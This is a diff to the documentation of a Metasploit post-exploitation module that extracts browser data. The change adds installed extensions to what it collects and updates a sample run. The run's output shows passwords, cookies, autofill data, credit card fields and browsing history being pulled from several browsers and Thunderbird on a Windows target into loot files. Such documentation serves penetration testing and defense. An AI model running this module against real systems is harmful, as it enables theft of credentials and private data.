@@ -1,7 +1,7 @@
 
 # Vulnerable Application
 
-This post-exploitation module extracts sensitive browser data from both Chromium-based and Gecko-based browsers on the target system. It supports the decryption of passwords and cookies using Windows Data Protection API (DPAPI) and can extract additional data such as browsing history, keyword search history, download history, autofill data, and credit card information.
+This post-exploitation module extracts sensitive browser data from both Chromium-based and Gecko-based browsers on the target system. It supports the decryption of passwords and cookies using Windows Data Protection API (DPAPI) and can extract additional data such as browsing history, keyword search history, download history, autofill data, credit card information and installed extensions.
 
 ## Supported Browsers
 
@@ -45,6 +45,7 @@ This post-exploitation module extracts sensitive browser data from both Chromium
 - Autofill Data
 - Credit Card Information
 - Bookmarks
+- Installed Extensions
 
 ### Gecko-Based Browsers
 
@@ -69,6 +70,7 @@ This post-exploitation module extracts sensitive browser data from both Chromium
 - Keyword Search History
 - Download History
 - Bookmarks
+- Installed Extensions
 
 ## Verification Steps
 
@@ -102,40 +104,45 @@ This post-exploitation module extracts sensitive browser data from both Chromium
 msf6 post(windows/gather/enum_browsers) > run
 
 [*] Targeting: W00T\ah (IP: 178.238.175.xxx)
-[*] System Information: W00T | OS: Windows 11 (10.0 Build 27718). | Arch: x64 | Lang: en_US
+[*] System Information: W00T | OS: Windows 11 (10.0 Build 27723). | Arch: x64 | Lang: en_US
 [*] Starting data extraction from user profile: C:\Users\ah
 [*]
-[*] Found Microsoft Edge (Version: 130.0.2849.27)
-[+] └ Extracted Passwords to /root/.msf4/loot/20241011120236_default_192.168.0.25_MicrosoftEdge_P_651273.txt (429 bytes)
+[*] Found Microsoft Edge (Version: 130.0.2849.46)
+[+] └ Extracted Passwords to /root/.msf4/loot/20241020211244_default_192.168.0.25_MicrosoftEdge_P_175146.txt (429 bytes)
+[+] └ Extracted Cookies to /root/.msf4/loot/20241020211244_default_192.168.0.25_MicrosoftEdge_C_184910.txt (3804 bytes)
+[+] └ Extracted Download history to /root/.msf4/loot/20241020211246_default_192.168.0.25_MicrosoftEdge_D_377750.txt (478 bytes)
+[+] └ Extracted Autofill data to /root/.msf4/loot/20241020211247_default_192.168.0.25_MicrosoftEdge_A_342470.txt (1096 bytes)
+[+] └ Extracted Keyword search history to /root/.msf4/loot/20241020211248_default_192.168.0.25_MicrosoftEdge_K_206619.txt (26 bytes)
+[+] └ Extracted Browsing history to /root/.msf4/loot/20241020211248_default_192.168.0.25_MicrosoftEdge_B_745128.txt (1801 bytes)
+[+] └ Extracted Extensions to /root/.msf4/loot/20241020211258_default_192.168.0.25_MicrosoftEdge_E_825996.txt (92 bytes)
+[*] Found Google Chrome (Version: 129.0.6668.101)
+[+] └ Extracted Passwords to /root/.msf4/loot/20241020211300_default_192.168.0.25_GoogleChrome_Pa_111957.txt (77 bytes)
 [-] └ Cannot access Cookies. File in use by another process.
-[+] └ Extracted Download history to /root/.msf4/loot/20241011120238_default_192.168.0.25_MicrosoftEdge_D_707263.txt (478 bytes)
-[+] └ Extracted Autofill data to /root/.msf4/loot/20241011120239_default_192.168.0.25_MicrosoftEdge_A_930320.txt (1096 bytes)
-[+] └ Extracted Keyword search history to /root/.msf4/loot/20241011120239_default_192.168.0.25_MicrosoftEdge_K_400301.txt (26 bytes)
-[+] └ Extracted Browsing history to /root/.msf4/loot/20241011120240_default_192.168.0.25_MicrosoftEdge_B_102881.txt (1801 bytes)
-[*] Found Google Chrome (Version: 129.0.6668.90)
-[+] └ Extracted Passwords to /root/.msf4/loot/20241011120245_default_192.168.0.25_GoogleChrome_Pa_088869.txt (77 bytes)
-[+] └ Extracted Cookies to /root/.msf4/loot/20241011120245_default_192.168.0.25_GoogleChrome_Co_162045.txt (2222 bytes)
-[+] └ Extracted Autofill data to /root/.msf4/loot/20241011120247_default_192.168.0.25_GoogleChrome_Au_146233.txt (140 bytes)
-[+] └ Extracted Browsing history to /root/.msf4/loot/20241011120248_default_192.168.0.25_GoogleChrome_Br_782055.txt (694 bytes)
-[*] Found Brave (Version: 129.1.70.126)
-[+] └ Extracted Passwords to /root/.msf4/loot/20241011120251_default_192.168.0.25_Brave_Passwords_885840.txt (73491 bytes)
+[+] └ Extracted Autofill data to /root/.msf4/loot/20241020211302_default_192.168.0.25_GoogleChrome_Au_349453.txt (140 bytes)
+[+] └ Extracted Browsing history to /root/.msf4/loot/20241020211303_default_192.168.0.25_GoogleChrome_Br_232123.txt (694 bytes)
+[+] └ Extracted Extensions to /root/.msf4/loot/20241020211310_default_192.168.0.25_GoogleChrome_Ex_885678.txt (93 bytes)
+[*] Found Brave (Version: 130.1.71.114)
+[+] └ Extracted Passwords to /root/.msf4/loot/20241020211313_default_192.168.0.25_Brave_Passwords_727540.txt (73491 bytes)
 [-] └ Cannot access Cookies. File in use by another process.
-[+] └ Extracted Download history to /root/.msf4/loot/20241011120311_default_192.168.0.25_Brave_DownloadH_574706.txt (7456 bytes)
-[+] └ Extracted Autofill data to /root/.msf4/loot/20241011120312_default_192.168.0.25_Brave_AutofillD_971776.txt (62140 bytes)
-[+] └ Extracted Keyword search history to /root/.msf4/loot/20241011120331_default_192.168.0.25_Brave_KeywordSe_142633.txt (15683 bytes)
-[+] └ Extracted Browsing history to /root/.msf4/loot/20241011120351_default_192.168.0.25_Brave_BrowsingH_155180.txt (1112464 bytes)
-[+] └ Extracted Bookmarks to /root/.msf4/loot/20241011120351_default_192.168.0.25_Brave_Bookmarks_472136.txt (8544 bytes)
-[*] Found Mozilla Firefox (Version: 130.0.1)
-[+] └ Extracted Cookies to /root/.msf4/loot/20241011120354_default_192.168.0.25_MozillaFirefox__712409.txt (3948 bytes)
-[+] └ Extracted Download history to /root/.msf4/loot/20241011120357_default_192.168.0.25_MozillaFirefox__706685.txt (247 bytes)
-[+] └ Extracted Keyword search history to /root/.msf4/loot/20241011120358_default_192.168.0.25_MozillaFirefox__454740.txt (44 bytes)
-[+] └ Extracted Browsing history to /root/.msf4/loot/20241011120402_default_192.168.0.25_MozillaFirefox__906755.txt (6693 bytes)
-[+] └ Extracted Bookmarks to /root/.msf4/loot/20241011120405_default_192.168.0.25_MozillaFirefox__148833.txt (7053 bytes)
-[+] └ Extracted Browsing history to /root/.msf4/loot/20241011120409_default_192.168.0.25_MozillaFirefox__508417.txt (5671 bytes)
-[+] └ Extracted Bookmarks to /root/.msf4/loot/20241011120410_default_192.168.0.25_MozillaFirefox__279997.txt (7053 bytes)
+[+] └ Extracted Download history to /root/.msf4/loot/20241020211333_default_192.168.0.25_Brave_DownloadH_739572.txt (7456 bytes)
+[+] └ Extracted Autofill data to /root/.msf4/loot/20241020211334_default_192.168.0.25_Brave_AutofillD_459908.txt (62376 bytes)
+[+] └ Extracted Keyword search history to /root/.msf4/loot/20241020211353_default_192.168.0.25_Brave_KeywordSe_109050.txt (17259 bytes)
+[+] └ Extracted Browsing history to /root/.msf4/loot/20241020211413_default_192.168.0.25_Brave_BrowsingH_992927.txt (1220056 bytes)
+[+] └ Extracted Bookmarks to /root/.msf4/loot/20241020211413_default_192.168.0.25_Brave_Bookmarks_173688.txt (8544 bytes)
+[+] └ Extracted Extensions to /root/.msf4/loot/20241020211430_default_192.168.0.25_Brave_Extensions_472872.txt (689 bytes)
+[*] Found Mozilla Firefox (Version: 131.0.3)
+[+] └ Extracted Cookies to /root/.msf4/loot/20241020211433_default_192.168.0.25_MozillaFirefox__552779.txt (3948 bytes)
+[+] └ Extracted Download history to /root/.msf4/loot/20241020211437_default_192.168.0.25_MozillaFirefox__372947.txt (247 bytes)
+[+] └ Extracted Keyword search history to /root/.msf4/loot/20241020211437_default_192.168.0.25_MozillaFirefox__943258.txt (44 bytes)
+[+] └ Extracted Browsing history to /root/.msf4/loot/20241020211441_default_192.168.0.25_MozillaFirefox__120866.txt (6693 bytes)
+[+] └ Extracted Bookmarks to /root/.msf4/loot/20241020211445_default_192.168.0.25_MozillaFirefox__376607.txt (7053 bytes)
+[+] └ Extracted Extensions to /root/.msf4/loot/20241020211445_default_192.168.0.25_MozillaFirefox__735144.txt (77 bytes)
+[+] └ Extracted Browsing history to /root/.msf4/loot/20241020211448_default_192.168.0.25_MozillaFirefox__908275.txt (5671 bytes)
+[+] └ Extracted Bookmarks to /root/.msf4/loot/20241020211449_default_192.168.0.25_MozillaFirefox__878028.txt (7053 bytes)
 [*] Found Thunderbird (Version: 115.11.1)
-[+] └ Extracted Passwords to /root/.msf4/loot/20241011120412_default_192.168.0.25_Thunderbird_Pass_593880.json (4052 bytes)
-[+] └ Extracted Cookies to /root/.msf4/loot/20241011120413_default_192.168.0.25_Thunderbird_Cook_124188.txt (546 bytes)
+[+] └ Extracted Passwords to /root/.msf4/loot/20241020211452_default_192.168.0.25_Thunderbird_Pass_476857.json (4052 bytes)
+[+] └ Extracted Cookies to /root/.msf4/loot/20241020211452_default_192.168.0.25_Thunderbird_Cook_867241.txt (546 bytes)
+[+] └ Extracted Extensions to /root/.msf4/loot/20241020211504_default_192.168.0.25_Thunderbird_Exte_041195.txt (77 bytes)
 [*] Post module execution completed
 ```
 
